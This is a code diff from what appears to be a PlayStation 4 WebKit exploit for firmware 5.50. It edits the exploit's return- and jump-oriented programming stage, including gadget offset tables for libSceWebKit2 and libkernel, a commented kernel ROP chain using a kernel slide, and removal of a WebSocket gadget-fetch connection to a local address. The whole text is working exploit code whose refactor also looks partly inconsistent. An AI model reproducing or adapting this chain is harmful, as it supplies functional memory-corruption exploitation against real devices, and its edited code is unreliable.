@@ -74,7 +74,7 @@ window.stage2 = function() {
     }
 }
 /* For storing the gadget and import map */
-window.GadgetMap = [];
+window.GadgetMap_wk = [];
 window.slowpath_jop = [];
 
 /* Simply adds given offset to given module's base address */
@@ -84,8 +84,7 @@ function getGadget(moduleName, offset) {
 
 /* All function stubs / imports from other modules */
 var slowpath_jop = function() {
-    window.basicImportMap = {
-        '5.50': {
+    slowpath_jop = {'5.50': {
             'setjmp': getGadget('libSceWebKit2', 0x14F8), // setjmp imported from libkernel
             '__stack_chk_fail_ptr': getGadget('libSceWebKit2', 0x384BA40), // pointer to pointer to stack_chk_fail imported from libkernel -> look at epilogs to find this
             "sceKernelLoadStartModule": getGadget('libkernel', 0x31470), // dump libkernel using the stack_chk_fail pointer to find base, then look for _sceKernelLoadStartModule
@@ -94,8 +93,7 @@ var slowpath_jop = function() {
 }
 
 var gadgetmap_wk = function() {
-    gadgetnames = {
-        '5.50': {
+     gadgetmap_wk = {'5.50': {
             'pop rsi': getGadget('libSceWebKit2', 0x0008f38a), // 0x000000000008f38a : pop rsi ; ret // 5ec3
             'pop rdi': getGadget('libSceWebKit2', 0x00038dba), // pop rdi ; ret
             'pop rax': getGadget('libSceWebKit2', 0x000043f5), // pop rax ; ret
@@ -132,51 +130,19 @@ var gadgetmap_wk = function() {
             // 0x013d1a00 : mov rdi, qword ptr [rdi] ; mov rax, qword ptr [rdi] ; mov rax, qword ptr [rax] ; jmp rax // 488b3f488b07488b00ffe0   
             // 0x00d65230: mov rdi, qword [rdi+0x18] ; mov rax, qword [rdi] ; mov rax, qword [rax+0x58] ; jmp rax ;  // 48 8B 7F 18 48 8B 07 48  8B 40 58 FF E0
             'jmp addr': getGadget('libSceWebKit2', 0x00d65230),
-        }
+       }
     };
 }
- var gadgetcache = {
-      /*
-      kchain.push(window.gadgets["pop rax"]);
-      kchain.push(savectx.add32(0x30));
-      kchain.push(window.gadgets["mov rax, [rax]"]);
-      kchain.push(window.gadgets["pop rcx"]);
-      kchain.push(kernel_slide);
-      kchain.push(window.gadgets["add rax, rcx"]);
-      kchain.push(window.gadgets["pop rdi"]);
-      kchain.push(savectx.add32(0x50));
-      kchain.push(window.gadgets["mov [rdi], rax"]);
-      */
-"ret":                    0x0000003C,
-"jmp rax":                0x00000082,
-"ep":                     0x000000AD,
-"pop rbp":                0x000000B6,
-"mov [rdi], rax":             782172,
-"pop r8":                 0x0000CC42,
-"pop rax":                     17781,
-"mov rax, rdi":                23248,
-"mov rax, [rax]":         0x000130A3,
-"pop rsi":                    597265,
-"pop rdi":                    239071,
-"add rsi, rcx; jmp rsi":  0x001FA5D4,
-"pop rcx":                0x00271DE3,
-"pop rsp":                    128173,
-"mov [rdi], rsi":             150754,
-"mov [rax], rsi":         0x003D0877,
-"add rsi, rax; jmp rsi":  0x004E040C,
-"pop rcx":                0x00271DE3,
-"jop":                        813600,
-"pop rdx":                0x00565838,
-"pop r9":                 0x0078BA1F,
-"add rax, rcx":           0x0084D04D,
-"infloop":                0x012C4009,
+var gadgets;
+window.stage2 = function() {
+    try {
+        window.stage2_();
+    } catch (e) {
+        print(e);
+    }
+}
 
-"stack_chk_fail":         0x000000C8,
-"memcpy":                 0x000000F8,
-"setjmp":                 0x000014f8
-},
-
- gadgeton = {};
+ var gadgets = {}; 
 
 window.stage2_ = function() {
     p = window.prim;
@@ -189,8 +155,6 @@ window.stage2_ = function() {
         return (p.read8(fptr_store.add32(0x18))).add32(0x40);
     }
  gadgetconn = 0;
-    if (!gadgetcache)
-        gadgetconn = new WebSocket('ws://10.17.0.1:8080');
 
     var parseFloatStore = p.leakfunc(parseFloat);
     var parseFloatPtr = p.read8(parseFloatStore);
@@ -209,10 +173,46 @@ window.stage2_ = function() {
     }
 
     gadgets = {
-        "stack_chk_fail": o2wk(0xc8),
+    /*
+      kchain.push(window.gadgets["pop rax"]);
+      kchain.push(savectx.add32(0x30));
+      kchain.push(window.gadgets["mov rax, [rax]"]);
+      kchain.push(window.gadgets["pop rcx"]);
+      kchain.push(kernel_slide);
+      kchain.push(window.gadgets["add rax, rcx"]);
+      kchain.push(window.gadgets["pop rdi"]);
+      kchain.push(savectx.add32(0x50));
+      kchain.push(window.gadgets["mov [rdi], rax"]);
+      */ 
+  "ret":                    o2wk(0x3C),
+  "jmp rax":                o2wk(0x82),
+  "ep":                     o2wk(0xAD),
+  "pop rbp":                o2wk(0xB6),
+  "mov [rdi], rax":         o2wk(0x3FBA),
+  "pop r8":                 o2wk(0xCC42),
+  "pop rax":                o2wk(0xCC43),
+  "mov rax, rdi":           o2wk(0xE84E),
+  "mov rax, [rax]":         o2wk(0x130A3),
+  "mov rdi, rax; jmp rcx":  o2wk(0x3447A), 
+  "pop rsi":                o2wk(0x7B1EE),
+  "pop rdi":                o2wk(0x7B23D),
+  "add rsi, rcx; jmp rsi":  o2wk(0x1FA5D4),
+  "pop rcx":                o2wk(0x271DE3),
+  "pop rsp":                o2wk(0x27A450),
+  "mov [rdi], rsi":         o2wk(0x39CF70),
+  "mov [rax], rsi":         o2wk(0x3D0877),
+  "add rsi, rax; jmp rsi":  o2wk(0x4E040C),
+  "pop rdx":                o2wk(0x565838),
+  "pop r9":                 o2wk(0x78BA1F),
+  "add rax, rcx":           o2wk(0x84D04D),
+  "jop":                    o2wk(0x1277350),
+  "infloop":                o2wk(0x12C4009),
+
+  "stack_chk_fail": o2wk(0xc8),
         "memset": o2wk(0x228),
         "setjmp": o2wk(0x14f8)
     };
+        
    
 /*
     var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets['stack_chk_fail']));
@@ -259,15 +259,15 @@ window.stage2_ = function() {
     
     gadgets_to_find++; // slowpath_jop
     var findgadget = function(donecb) {
-        if (gadgetcache)
+        if (gadgets)
         {
             gadgets_to_find=0;
             slowpath_jop=0;
             log("using gadgets");
             
-            for (var gadgetname in gadgetcache) {
-                if (gadgetcache.hasOwnProperty(gadgetname)) {
-                    gadgets[gadgetname] = o2wk(gadgetcache[gadgetname]);
+            for (var gadgetname in gadgets) {
+                if (gadgets.hasOwnProperty(gadgetname)) {
+                    gadgets[gadgetname] = o2wk(gadgets[gadgetname]);
                 }
             }
             
